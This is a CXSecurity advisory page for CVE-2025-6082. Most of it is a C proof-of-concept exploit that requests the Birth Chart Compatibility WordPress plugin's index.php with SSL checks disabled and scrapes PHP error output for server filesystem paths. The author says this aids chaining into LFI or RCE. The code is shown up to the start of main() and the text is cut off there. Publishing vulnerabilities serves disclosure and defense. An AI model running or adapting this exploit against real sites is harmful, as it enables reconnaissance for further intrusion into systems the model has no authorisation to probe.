---
title: Birth Chart Compatibility WordPress Plugin 2.0 Full Path Disclosure
url: https://cxsecurity.com/issue/WLB-2025120031
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-28
fetch_date: 2025-12-29T03:33:33.716873
---

# Birth Chart Compatibility WordPress Plugin 2.0 Full Path Disclosure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Birth Chart Compatibility WordPress Plugin 2.0 Full Path Disclosure** **2025.12.28**  Credit:  **[Byte Reaper](https://cxsecurity.com/author/Byte%2BReaper/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-6082](https://cxsecurity.com/cveshow/CVE-2025-6082/ "Click to see CVE-2025-6082")**  CWE: **N/A** | |

/\*
\* Exploit Title : Birth Chart Compatibility WordPress Plugin 2.0 - Full Path Disclosure
\* Author : Byte Reaper
\* Telegram : @ByteReaper0
\* CVE : CVE-2025-6082
\* Software Link : https://frp.wordpress.org/plugins/birth-chart-compatibility/
\* Description : Proof‑of‑Concept exploits the Full Path Disclosure bug in the
\* “Birth Chart Compatibility” WordPress plugin (<=v2.0). It sends
\* an HTTP GET request to the plugin’s index.php endpoint, captures
\* the resulting PHP warning or fatal error, and parses the server’s
\* filesystem path (e.g. “/var/www/html/wp-content/plugins/…” or
\* “C:\\xampp\\htdocs\\…”). Revealing this path aids attackers in
\* chaining further LFI/RCE or reconnaissance attacks.
\*/
#include<stdio.h>
#include"argparse.h"
#include<string.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <unistd.h>
#define FULL 2300
const char \*url = NULL;
const char \*cookies=NULL;
int selecetCookie = 0;
int verbose = 0;
void exitSyscall()
{
\_\_asm\_\_ volatile
(
"xor %%rdi, %%rdi\n\t"
"mov $0x3C, %%rax\n\t"
"syscall\n\t"
:
:
:"rax", "rdi"
);
}
const char \*keyFound[] =
{
"Warning:",
"Fatal error:",
"/var/www/",
"C:\\xampp\\"
};
struct Mem
{
char \*buffer;
size\_t len;
};
size\_t write\_cb(void \*ptr, size\_t size, size\_t nmemb, void \*userdata)
{
size\_t total = size \* nmemb;
struct Mem \*m = (struct Mem \*)userdata;
char \*tmp = realloc(m->buffer, m->len + total + 1);
if (tmp == NULL)
{
printf("\e[1;31m[-] Failed to allocate memory!\e[0m\n");
exitSyscall();
}
m->buffer = tmp;
memcpy(&(m->buffer[m->len]), ptr, total);
m->len += total;
m->buffer[m->len] = '\0';
return total;
}
void showPath(const char \*targetUrl)
{
char full[FULL];
CURLcode curlCode;
struct Mem response = {NULL, 0};
CURL \*curl = curl\_easy\_init();
if (curl == NULL)
{
exitSyscall();
}
response.buffer = NULL;
response.len = 0;
if (verbose)
{
printf("==========================================\e[0m\n");
printf("[+] Cleaning Response...\e[0m\n");
printf("[+] Response Buffer : %s\e[0m\n", response.buffer);
printf("[+] Response Len : %zu\e[0m\n", response.len);
printf("==========================================\e[0m\n");
}
fflush(stdout);
if (curl)
{
snprintf(full, sizeof(full), "%s/wp-content/plugins/birth-chart-compatibility/index.php", targetUrl);
curl\_easy\_setopt(curl,
CURLOPT\_URL,
full);
if (selecetCookie)
{
curl\_easy\_setopt(curl,
CURLOPT\_COOKIEFILE,
cookies);
curl\_easy\_setopt(curl,
CURLOPT\_COOKIEJAR,
cookies);
}
curl\_easy\_setopt(curl,
CURLOPT\_ACCEPT\_ENCODING,
"");
curl\_easy\_setopt(curl,
CURLOPT\_FOLLOWLOCATION,
1L);
sleep(1);
curl\_easy\_setopt(curl,
CURLOPT\_WRITEFUNCTION,
write\_cb);
curl\_easy\_setopt(curl,
CURLOPT\_WRITEDATA,
&response);
curl\_easy\_setopt(curl,
CURLOPT\_CONNECTTIMEOUT,
5L);
curl\_easy\_setopt(curl,
CURLOPT\_TIMEOUT,
10L);
curl\_easy\_setopt(curl,
CURLOPT\_SSL\_VERIFYPEER,
0L);
curl\_easy\_setopt(curl,
CURLOPT\_SSL\_VERIFYHOST,
0L);
if (verbose)
{
printf("\e[1;35m------------------------------------------[Verbose Curl]------------------------------------------\e[0m\n");
curl\_easy\_setopt(curl,
CURLOPT\_VERBOSE,
1L);
}
struct curl\_slist \*h = NULL;
h = curl\_slist\_append(h,
"Accept: text/html");
h = curl\_slist\_append(h,
"Accept-Encoding: gzip");
h = curl\_slist\_append(h,
"Accept-Language: en-US,en");
h = curl\_slist\_append(h,
"Connection: keep-alive");
h = curl\_slist\_append(h,
"Referer: http://example.com");
curl\_easy\_setopt(curl, CURLOPT\_HTTPHEADER, h);
long httpCode = 0;
curlCode = curl\_easy\_perform(curl);
if (curlCode == CURLE\_OK)
{
printf("---------------------------------------------------------------------------------------\n");
printf("\e[1;36m[+] Request sent successfully\e[0m\n");
printf("\e[1;33m[+] Input Url : %s\e[0m\n", targetUrl);
printf("\e[1;33m[+] Full Format Url : %s\e[0m\n",full);
curl\_easy\_getinfo(curl, CURLINFO\_RESPONSE\_CODE,
&httpCode);
int numberKey = sizeof(keyFound) / sizeof(keyFound[0]);
if (httpCode >= 200 && httpCode < 300)
{
printf("[+] Http Code (200 < 300) !\e[0m\n");
printf("\e[1;32m[+] Http Code : %ld\e[0m\n", httpCode);
printf("\e[1;35m====================================[Response]====================================\e[0m\n");
printf("%s\n", response.buffer);
printf("\e[1;32m[+] Response Len : %zu\e[0m\n", response.len);
printf("\e[1;35m===================================================================================\e[0m\n\n");
for (int k = 0; k < numberKey; k++)
{
const char \*found = strstr(response.buffer, keyFound[k]);
if (found)
{
printf("\e[1;34m[+] Keyword found: %s\e[0m\n", keyFound[k]);
printf("\e[1;34m[+] Context: %.100s\e[0m\n", found);
}
}
}
else
{
printf("\e[1;31m[-] Http Code : %ld\e[0m\n", httpCode);
printf("\e[1;31m[-] Please Check Your input Path !\e[0m\n");
printf("\e[1;31m[-] Or Connection in Tragte : (%s)\e[0m\n", targetUrl);
if (verbose)
{
printf("\e[1;35m====================================[Response]====================================\n");
printf("%s\n", response.buffer);
printf("\e[1;32m[+] Response Len : %zu\e[0m\n", response.len);
printf("\e[1;35m===================================================================================\n\n");
}
}
}
else
{
printf("\e[1;31m[-] The request was not sent !\e[0m\n");
if (verbose)
{
printf("\e[1;31m[-] Exit Syscall ...\e[0m\n");
}
printf("\e[1;31m[-] Error : %s\n", curl\_easy\_strerror(curlCode));
exitSyscall();
}
}
if (response.buffer)
{
free(response.buffer);
response.buffer = NULL;
response.len = 0;
}
curl\_easy\_cleanup(curl);
}
int main(int argc,
const char \*\*argv)
{
printf
(
"\e[1;91m"
"▄▖▖▖▄▖ ▄▖▄▖▄▖▄▖ ▄▖▄▖▄▖▄▖ \n"
"▌ ▌▌▙▖▄▖▄▌▛▌▄▌▙▖▄▖▙▖▛▌▙▌▄▌ \n"
"▙▖▚▘▙▖ ▙▖█▌▙▖▄▌ ▙▌█▌▙▌▙▖ \n"
"\e[1;97m\t Byte Reaper\e[0m\n"
);
printf("\e[1;91m-----------------------------------------------------------------------------------...